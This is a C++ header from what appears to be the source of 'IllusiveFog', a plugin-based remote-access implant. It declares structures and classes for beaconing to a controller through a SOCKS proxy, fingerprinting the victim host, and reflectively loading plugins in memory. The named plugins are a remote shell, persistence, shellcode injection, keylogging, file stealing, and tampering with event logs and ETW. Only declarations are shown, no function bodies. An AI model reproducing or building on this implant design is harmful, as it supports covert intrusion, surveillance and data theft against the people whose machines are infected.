#include "socketlib.h"
#include "aes.h"
#include "pkcs7_padding.h"
#include <shlwapi.h>
#include <ShlObj.h>
#pragma comment(lib,"Shlwapi.lib")
#pragma comment(lib,"Crypt32.lib")
#define USERNAME_SIZE 50
#define PLUGIN_COUNT 12
#define WM_IllusiveFog_EXIT_THREAD 1
#define WM_IllusiveFog_CONITINUE 2
#define WM_IllusiveFog_CALLBACK 4
#define WM_IllusiveFog_REPORT 3
#define WM_IllusiveFog_PLUGIN_LAUNCH 5
#define WM_IllusiveFog_PLUGIN_TERMINATE 6
#define WM_IllusiveFog_REPORT_ERROR_CODE 7
#define WM_IllusiveFog_LAUNCH_MANAGER_THREAD 8
#define WM_IllusiveFog_CRYPT_CALLBACK_REPORT 9

#define _MS_CRYPT 1900
typedef struct IllusiveFog_reporter {
	char* IllusiveFog_ec_path;
	char* IllusiveFog_param;
	char* dest;

}IllusiveFog_reporter, * PIllusiveFog_reporter;
typedef struct
{
	WORD	offset : 12;
	WORD	type : 4;
} IMAGE_RELOC, * PIMAGE_RELOC;
typedef struct BASE_RELOCATION_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;
typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;
typedef bool(__stdcall command)(HANDLE localevent);
//typedef struct pellet {
//	char* socks_ip = NULL;
//	char* dest_ip = NULL;
//	DWORD sockport = 0;
//	DWORD destport = 0;
//	DWORD sockstimer = 0;
//	char* pellet_key = NULL;
//	char* comm_key = NULL;
//	char* agent_id = NULL;
//	BOOL enable_auth = FALSE;
//	char* auth_user_id = NULL;
//	char* auth_user_pass = NULL;
//}pellet_param, * Ppellet_param;
typedef struct pellet {
	char* socks_ip;
	char* dest_ip;
	DWORD sockport;
	DWORD destport;
	DWORD sockstimer;
	char* pellet_key;
	char* agent_id;
	BOOL enable_auth;
	char* auth_user_id;
	char* auth_user_pass;
	char* comm_key;
}pellet_param, * Ppellet_param;
typedef struct
{
	HANDLE reporter_event;
	char* param;
	DWORD reporter_threadid;
	DWORD threadid;
	HANDLE hevent;
	HANDLE plugin_events;
	char* comm_key;
	Ppellet_param pellet_struct;

}plugin_param, * Pplugin_param;
//typedef struct
//{
//	HANDLE reporter_event = NULL;
//	char* param = NULL;
//	DWORD reporter_threadid = 0;
//	DWORD threadid = 0;
//	HANDLE hevent = NULL;
//	HANDLE plugin_events = NULL;
//
//	Ppellet_param pellet_struct;
//
//}plugin_param, * Pplugin_param;

enum env_sizes {
	sock_ip_size = 20,
	dest_ip_size = 20,
	initial_param_size1 = 20,
	initial_param_size2 = 20,
	initial_param_size3 = 20,
	initial_param_size4 = 20,
	initial_param_size5 = 20,
	agent_info_location_size = 30,
	clientid_size = 20,
	communication_key_size = 25,
	plugin_key_size = 35,
	pellet_key_size = 25,
	default_intial_post_request_size = 320,
	agent_get_request = 50,
	agent_post_request = 50,
	agent_plugin_request_size = 40,
	default_plugin_location_size = 50,
	agent_get_request_size = 40,
	agent_post_request_size = 40,
	reporter_param_size = 20,

};
typedef struct PluginPaths {
	char ShellPluginPath[default_plugin_location_size];
	char PersistPluginPath[default_plugin_location_size];
	char SelfSocksPluginPath[default_plugin_location_size];
	char InjShellCoPluginPath[default_plugin_location_size];
	char LoadPluginPath[default_plugin_location_size];
	char EVTXPluginPath[default_plugin_location_size];
	char ETWPluginPath[default_plugin_location_size];
	char VerbosePluginPath[default_plugin_location_size];
	char VerboseCounterPath[default_plugin_location_size];
	char CleanupPluginPath[default_plugin_location_size];
	char KeyLogPluginPath[default_plugin_location_size];
	char FileStealerPluginPath[default_plugin_location_size];

}PluginPaths, * PPluginPaths;
typedef struct Agent_info {
	char username[USERNAME_SIZE];
	char guid[HW_PROFILE_GUIDLEN];
	BOOL priv_level;
	char windows_version[200];
}Agent_info, * PAgent_Info;

typedef struct AgentSession_info {
	char ClientID[clientid_size];
	char CommunicationKey[communication_key_size];
	char Plugin_key[plugin_key_size];
	char pellet_key[pellet_key_size];
}AgentSession_info, * PAgentSession_info;
typedef struct AgentSession {
	char AgentID[clientid_size];
	char CommunicationKey[communication_key_size];
	char Plugin_key[plugin_key_size];
	char pellet_key[pellet_key_size];
	char AgentGetRequest[50]; //fix size
	char AgentPostRequest[50]; //fix size
	char AgentPluginPath[50]; //fix this
	char AgentErrorCodePath[50];
}struct_AgentSession, * PAgentSession;
enum plugins {
	SHELL_PLUGIN = 0,
	PERSIST_PLUGIN = 1,
	INJ_SHELLCOPLUGIN = 2,
	SELF_SOCKSPLUGIN = 3,
	LOAD_PLUGIN = 4,
	EVTX_PLUGIN = 5,
	ETW_PLUGIN = 6,
	VERBOSE_PLUGIN = 7,
	UNLOAD_PLUGIN = 8,
	CLEANUP_PLUGIN = 9,
	KEYLOG_PLUGIN = 10,
	FILESTEALER_PLUGIN = 11

};
typedef struct jobs {
	char jobid[20]; //fix this 
	enum plugins plugin;
	char* plugin_param;
	char* parameter_ptr;
	char* plugin_page;
	bool plugin_loaded;
	DWORD export_number;
	bool plugin_pellets;
	char* counter_landing = NULL;

}jobs, * PJobs;

typedef struct plugin_info {
	PVOID export_addr;
	LPVOID allocated_plugin;
}plugin_info, * Pplugin_info;
typedef struct reporter_param {
	char jobid[20];
	HANDLE reporter_event;
	char* socks_ip;
	char* dest_ip;
	DWORD sockport;
	DWORD destport;
	DWORD sockstimer;
	char* key = NULL;
	char* param1 = NULL;
	char* param2 = NULL;
	char* param3 = NULL;
	char* reporter_dest = NULL;
	char* error_code_path = NULL;
	char* agent_error_code_param = NULL;
	BOOL auth_enabled;
	char* auth_user = NULL;
	char* auth_pass = NULL;
}_reporter_param, * Preporter_param;
typedef struct report_com_param {
	char param1[reporter_param_size];
	char	 param2[reporter_param_size];
	char param3[reporter_param_size];
	char param4[reporter_param_size];
}report_com_param, * Preporter_com_param;

typedef void(__stdcall PluginExport)(HANDLE local_event);
typedef struct AES_STRUCT {
	BLOBHEADER blob_header;
	DWORD dwkeysize;
	BYTE szkey[16 + 1];
}_AES_STRUCT;
namespace IllusiveFog {


	class PluginManager {

	private:
		HANDLE hevents[PLUGIN_COUNT];
		HANDLE plugin_thread[PLUGIN_COUNT];
		DWORD worker_thread_id[PLUGIN_COUNT];
		PVOID plugin_export_function_addr[PLUGIN_COUNT];
	public:

		typedef enum plugin_manager_result {
			plugin_manager_s_ok = 0,
			plugin_manager_plugin_unset = -1,
			plugin_manager_plugin_already_inintialized = -2,
			plugin_manager_invalid_plugin_thread_launched = -3,
			plugin_manager_plugin_param_send_thread_failed = -4,
			plugin_manager_plugin_threads_terminted = -5

		};
		bool bset = false;

		LARGE_INTEGER lg_timer;
		PluginExport* PluginExports[PLUGIN_COUNT];
		PluginExport* Shellplug;
		PluginExport* SocksPlug;
		PluginExport* LdrPlug;
		PluginExport* ShellInjPlug;
		PluginExport* EvtxPlug;
		PluginExport* EtwPlug; //make this automated
		PluginExport* KeyLogPlug;
		typedef struct {
			PVOID shell_plugin_export = NULL;
			PVOID persist_plugin_export = NULL;
			PVOID inj_shellcoplugin_export = NULL;
			PVOID self_socksplugin_export = NULL;
			PVOID load_plugin_export = NULL;
			PVOID evtx_plugin_export = NULL;
			PVOID etw_plugin_export = NULL;
			PVOID cleanup_plugin_export = NULL;
			PVOID keylog_plugin_export = NULL;
			PVOID filestealer_plugin_export = NULL;
		}plugin_export, * Pplugin_export;
		HANDLE plugin_events[PLUGIN_COUNT];
		Pplugin_export plugin_export_inv = (Pplugin_export)malloc(sizeof(plugin_export));
		plugin_manager_result initialize_plugin_manager();
		plugin_manager_result set_plugin(enum plugins plugin, PVOID export_plugin);
		plugin_manager_result unset_plugin(enum plugins plugin);
		plugin_manager_result initialize_plugin(enum plugins plugin);
		//		plugin_manager_result shell_plugin_reporter();
		plugin_manager_result plugin_handler(enum plugins plugin);
		//	LPTHREAD_START_ROUTINE plugin_manager_thread(HANDLE param_event);
		plugin_manager_result plugin_manager_invoke_plugin(enum plugins plugin, LPVOID plugin_parameter, HANDLE reporter_thread);
		HANDLE worker_handle[PLUGIN_COUNT];
		DWORD dwthreadid[PLUGIN_COUNT];
		HANDLE plugin_timer[PLUGIN_COUNT];
		plugin_manager_result plugin_manager_timer(enum plugins plugin);
		plugin_manager_result plugin_terminate(enum plugins plugin);
		plugin_manager_result plugin_clear(enum plugins plugin);

	};
	class utils {
	public:

		typedef enum utils_result {
			utils_s_ok = 0,
			utils_aes_decryption_failed = -1,
			utils_base64_decode_failed = -2,
			utils_hex_decode_failed = -3,
			utils_aes_encryption_failed = -4,
			utils_hex_encode_failed = -5,
			utils_url_encode_failed = -6
		};
		//	utils_result utils_convert_to_base64(char *in,char *out,DWORD size);//implement this API set
		utils_result utils_convert_from_base64(char* in, char* out, DWORD size);
		utils_result utils_convert_from_hex(char* in, char* out, DWORD len);
		utils_result utils_convert_to_base64(char* in, char* out, DWORD size);
		utils_result utils_convert_to_hex(char* in, char* out, DWORD size, DWORD in_size);
		utils_result utils_aes_decrypt(unsigned char* aes_key, unsigned char* iv, unsigned char* buffer, int size);
		utils_result utils_aes_encrypt(unsigned char* aes_key, unsigned char* ivunsigned, unsigned char* buffer, DWORD max_buffer_size, DWORD buffer_size);
		utils_result utils_url_encode(char* in, char* out, DWORD size);
		utils_result utils_unicode_to_ansi(wchar_t* unicode_string, char* ansi_out, DWORD size);
		utils_result utils_aes_encrypt_ms(unsigned char* aes_key, unsigned char* ivunsigned, unsigned char* buffer, DWORD max_buffer_size, DWORD buffer_size, bool bcrypt);
		utils_result utils_aes_decrypt_ms(unsigned char* aes_key, unsigned char* iv, unsigned char* buffer, DWORD buffer_size);
		DWORD utils_last_error;
		struct AES_ctx ctx;
		_AES_STRUCT MS_AES;
		HCRYPTPROV h_prov = NULL;
		HCRYPTKEY h_key = NULL;
	};
	class reporter :public utils, socketlib {
	private:
		typedef enum reporter_result {
			reporter_success = 0,
		};
		HCRYPTPROV hCryptProv;
		DWORD total = 0;
		unsigned char* crypted_result = NULL;
		unsigned char* hex_result = NULL;
		unsigned char iv[16];
		unsigned char* hex_iv = NULL;
		char* delimiter = (char*)" <hr> ";
		char* chtemp = NULL;
		DWORD dwtemp = 0;
		unsigned char* result_max = NULL;
		char* final_result;
		reporter_result crypt_result(unsigned char* result, unsigned char* key, DWORD size);
		reporter_result form_iv();
		reporter_result form_message();
		reporter_result hex_iv_message(unsigned char* iv, unsigned char* message, DWORD report_size);
		reporter_result form_final_message(unsigned char* hex_iv, unsigned char* hex_message);
		char* ec_path = NULL;
		char* ec = NULL;
		char* ec_result = NULL;
	public:

		char* final_report = NULL;
		reporter_result reporter_initalize(Preporter_param reporter);
		reporter_result form_reporter_message(char* report, char* error_code, unsigned char* key); //error_code for future
		reporter_result form_reporter_parameters(char* result, char* jobid, char* state, char* ec, DWORD error_code); //show,browse,ID or callaback,error_code
		reporter_result report(char* reporter_dest, char* host);
		reporter_result reporter_clean();
		reporter_result form_error_code_parameter(char* error_code, char* error_code_param);
		reporter_result report_error_code(char* error_code_pat, char* host);
	};

	class Plugin : public PluginManager {
	public:
		DWORD total_plugins = 8;
		enum plugin_result {
			plugin_s_unload = 1,
			plugin_s_ok = 0,
			plugin_setpath_heap_corrupted = -1,
			plugin_invalid_job = -2,
			plugin_error_already_loaded = -3,
			plugin_error_set_plugin_hex_command = -4,
			plugin_error_plugin_parsing_failed = -5,
			plugin_error_invalid_plugin = -6,
			plugin_error_load_plugin_failed = -7
		};
		enum plugin_path_size {
			default_plugin_location_size = 50,

		};
		char hex_commands_plugin[PLUGIN_COUNT][100];
		bool plugin_loaded[PLUGIN_COUNT] = { FALSE,FALSE,FALSE,FALSE,FALSE,FALSE,FALSE,FALSE,FALSE };
		plugin_result set_plugin_paths(char* ShellPlugin, char* PersistPlugin, char* SelfSocksPlugin, char* InjShellCoPluginmcgar, char* loadPlugin, char* EVTXPlugin, char* ETWPlugin, char* cleanupPlugin, char* VerbosePlugin, char* VerboseCounterPath, char* KeyLogPlugin, char* FileStealer);
		PPluginPaths plugin_path = NULL;
		plugin_result set_plugin_hex_commands(char* hex_shell, char* hex_persist, char* hex_shellinj, char* hex_selfsocks, char* hex_load, char* hex_evtx, char* hex_etw, char* hex_verbose, char* hex_cleanup, char* hex_unload, char* hex_keylog, char* hex_filestealer);
		plugin_result parse_plugin(PJobs job, char* string);
		DWORD  get_plugin(char* plugin);
		plugin_result plugin_load(DWORD export_number, PBYTE plugin_memory, PJobs job, Pplugin_info plug_info);
		plugin_result set_plugin_job(PJobs jobs, char* plugin, char* string);
		plugin_result plugin_ldr_map(DWORD file_size, PBYTE plugin_memory);
		plugin_result plugin_ldr_relocate();
		plugin_result plugin_ldr_form_iat();
		/*plugin_result resolve_delay_imports();
		*/
		plugin_result plugin_ldr_set_protection();
		plugin_result plugin_unload(enum plugins plugin);
		LPVOID plugin_ldr_get_exports(PIMAGE_EXPORT_DIRECTORY export_dir, DWORD export_number);
		plugin_result plugin_ldr_cleanup();
		PIMAGE_DOS_HEADER dos_head = NULL;
		PIMAGE_NT_HEADERS nt_head = NULL;
		PBYTE memory = NULL;
		PIMAGE_SECTION_HEADER section_head = NULL;
		PIMAGE_EXPORT_DIRECTORY export_directory = NULL;
		DWORD delta = 0;
		DWORD dwplugin_temp = 0;
		PIMAGE_EXPORT_DIRECTORY img_exports = NULL;
	private:
		DWORD PluginLoadedCount = 0;
		DWORD PluginThreadsCount = 0;
		LPVOID va_plugin_memory[PLUGIN_COUNT];
		DWORD va_plugin_memory_size[PLUGIN_COUNT];
		plugin_result return_plugin_results;

	};
	class MemoryManager {
	public:
		enum memory_manager_result {
			memory_s_ok = 0,
			invalid_temp_memory_freed = -1,
			invalid_heap_freed = -2
		};

		LPVOID AllocateTemporary(DWORD size);
		memory_manager_result FreeTemporary(LPVOID Memory);
		DWORD TempoararyMemoryCount = 0;
		PAgent_Info AllocateAgentInfo();
		PAgentSession_info AllocateAgent_SessionInfo();
		PPluginPaths AllocatePluginPath();
		LPVOID AllocateAgentSession();
		memory_manager_result FreeAgentSessionInfo(PAgentSession_info PAgentSessionInfo);
		memory_manager_result FreeAgentInfo(PAgent_Info PAgentInfo);
		PJobs AllocateJobs();
		memory_manager_result FreeJobs(PJobs jobs);
		LPVOID allocate_parameter(DWORD size);
		memory_manager_result FreeParameter(LPVOID parameter);
		LPVOID allocate_plugin(DWORD size);
		memory_manager_result free_plugin(LPVOID plugin, DWORD size);
		Pplugin_param allocate_plugin_param_struct();
		memory_manager_result plugin_param_struct_free(LPVOID plugin_param_struct);
		Preporter_param allocate_reporter_param();
		memory_manager_result free_reporter_param(LPVOID reporter_param);
		Pplugin_info allocate_plugin_info();
		memory_manager_result free_plugin_info(LPVOID plugin_info);
		Preporter_com_param allocate_reporter_com_param();
		memory_manager_result free_reporter_com_param();
		PIllusiveFog_reporter allocate_IllusiveFog_reporter();
		memory_manager_result free_IllusiveFog_reporter(LPVOID ptr);
		Preporter_param IllusiveFog_alloc_reporter();
	private:
		DWORD reporter_com_param_count = 0;
		DWORD AgentSessioninfoCount = 0;
		DWORD AgentInfoCount = 0;
		DWORD PluginPathCount = 0;
		DWORD AgentSession = 0;
		DWORD JobsCount = 0;
		DWORD parameter_count = 0;
		DWORD plugin_count = 0;
		DWORD plugin_param_struct_count = 0;
		DWORD reporter_struct_count = 0;
		DWORD plugin_info_count = 0;
		DWORD IllusiveFog_reporter_count = 0;

	};
	class IllusiveFog : private MemoryManager, private socketlib, private Plugin, private utils, public PluginManager, private reporter {

	public:
		enum IllusiveFog_size {
			sock_address_size = 30,
			dest_address_size = 30

		};
		enum IllusiveFog_result {
			IllusiveFog_s_plugin_unload = 1,
			IllusiveFog_s_ok = 0,
			IllusiveFog_no_sockip = -1,
			IllusiveFog_no_hostip = -2,
			IllusiveFog_no_sockport = -3,
			IllusiveFog_no_hostport = -4,
			IllusiveFog_post_request_heap_corrupted = -5,
			IllusiveFog_no_intial_params = -6,
			form_agent_session_heap_corrupted = -7,
			IllusiveFog_get_agent_info_failed = -8,
			set_agent_session_info_error = -9,
			IllusiveFog_heap_corrupted_receive_jobs = -10,
			IllusiveFog_error_no_job_received = -11,
			IllusiveFog_error_plugin_already_loaded = -12,
			IllusiveFog_error_invalid_heap_allocated = -13,
			IllusiveFog_error_failed_send_agent_info = -14,
			IllusiveFog_error_form_hex_command_failed = -15,
			IllusiveFog_error_form_agent_requirements_failed = -16,
			IllusiveFog_error_plugin_load_failed = -17,
			IllusiveFog_error_plugin_parse_failed = -18,
			IllusiveFog_error_plugin_set_failed = -19,
			IllusiveFog_error_plugin_unset_failed = -20,
			IllusiveFog_error_IllusiveFog_invoke_plugin_failed = -21,
			IllusiveFog_error_agent_plugin_req_failed = -22,
			IllusiveFog_error_plugin_unloaded = -23,
			IllusiveFog_error_no_jobs = -24,
			IllusiveFog_agent_crashed = -25

		};

		IllusiveFog(char* sockip, int sockport, char* hostip, int hostport, int sockswait, char* socks_user_auth, char* socks_pass_auth, BOOL auth_enabled);
		PAgent_Info GetAgentInfo();
		IllusiveFog_result send_IllusiveFog_agent_info(PAgent_Info agent_info, char* intial_param1, char* initial_param2, char* intial_param3, char* intial_param4, char* initial_param5, char* intial_request_location, char* buffer, char* output_buffer);
		PAgentSession_info SetAgentSession_info(char* AgentSession_buffer);
		IllusiveFog_result	form_plugins(char* ShellPlugin, char* PersistPlugin, char* SelfSocks, char* InjShell, char* loadPlugin, char* EVTXPlugin, char* ETWPlugin, char* VerboseReconPlugin, char* VerboseCounter, char* CleanupPlugin, char* KeyLogPlugin, char* FileStealerPlugin);
		IllusiveFog_result form_agent_session(PAgentSession_info agent_session_info, PAgent_Info agent_info, char* GetRequest, char* PostRequest, char* PluginPath, char* AgentErrorCodePath);
		IllusiveFog_result IllusiveFog_crash_report(char* crash_message, char* output);
		IllusiveFog_result IllusiveFog_form_hexcommands(char* hex_shell, char* hex_persist, char* hex_shellinj, char* hex_selfsocks, char* hex_load, char* hex_evtx, char* hex_etw, char* hex_verbose, char* hex_cleanup, char* hex_unload, char* hex_keylog, char* hex_filestealer);
		IllusiveFog_result IllusiveFog_receive_jobs(char* get_jobs_buffer, char* jobs_buffer, DWORD get_job_buffer_size);
		PJobs IllusiveFog_form_jobs();
		IllusiveFog_result IllusiveFog_load_plugin(PJobs jobs, char* get_content_length_buffer, char* get_request_buffer, char* plugin_request);
		IllusiveFog_result IllusiveFog_invoke_plugin(PJobs jobs);
		IllusiveFog_result IllusiveFog_agent_report(char* message_report, char* ot);
		static void IllusiveFog_job_reporter(Preporter_param reporter_param);
		IllusiveFog_result IllusiveFog_unload_plugin(enum plugins plugin);
		IllusiveFog_result IllusiveFog_set_plugin(enum plugins plugin, Pplugin_info plug_info);
		IllusiveFog_result IllusiveFog_check_plugin_status();
		IllusiveFog_result IllusiveFog_unset_plugin(enum plugins plugin);
		IllusiveFog_result IllusiveFog_set_reporter_param(char* param1, char* param2, char* param3, char* param4);
		IllusiveFog_result IllusiveFog_agent_reporter(char* message, char* key, char* jobid);
		IllusiveFog_result IllusiveFog_set_ecpath(char* ec_param, char* dest);
#ifdef _DEBUG
		void IllusiveFog_debug(IllusiveFog_result IllusiveFog_debug_result);
		void IllusiveFog_debug_socket(sock_result socket_debug_result);
		void IllusiveFog_debug_memory_manager(memory_manager_result memory_manager_debug_result);
		void IllusiveFog_plugin_debug(plugin_result plugin_debug_result);
		void IllusiveFog_debug_utils(utils_result util_debug_result);
		void IllusiveFog_plugin_manager_debug(plugin_manager_result plugin_manager_debug_result);
#endif
		Preporter_com_param report_communication_parameter = NULL;
		void IllusiveFog_report_ec_test(DWORD rep);
		Preporter_param IllusiveFog_report_param;
	private:

		PIllusiveFog_reporter IllusiveFog_report = NULL;
		PAgentSession IllusiveFog_agent_session = NULL;
		IllusiveFog_result form_IllusiveFog_agent_post_request(PAgent_Info agent_info, char* intial_param1, char* initial_param2, char* intial_param3, char* intial_param4, char* initial_param5, char* buffer);
		IllusiveFog_result form_IllusiveFog_agent_requirements(PJobs job, char* base_string);
		IllusiveFog_result form_IllusiveFog_agent_plugin_requirements(char* plugin, DWORD plugin_size, PJobs job, Pplugin_info plug_info);
		IllusiveFog_result IllusiveFog_agent_report_ec(DWORD agent_ec);
		PVOID ptemp = NULL;
		char sock_address[sock_address_size] = "\x0";
		char dest_address[dest_address_size] = "\x0";
		char* break_ptr = (char*)"!";
		IllusiveFog_result form_address(char* sockip, int sockport, char* hostip, int hostport);
		sock_result socket_result;
		memory_manager_result memory_result;
		IllusiveFog_result IllusiveFog_agent_result;
		plugin_result IllusiveFog_plugin_result;
		plugin_manager_result plugin_debug_manager;
		DWORD dwtemp = 0;
	};
}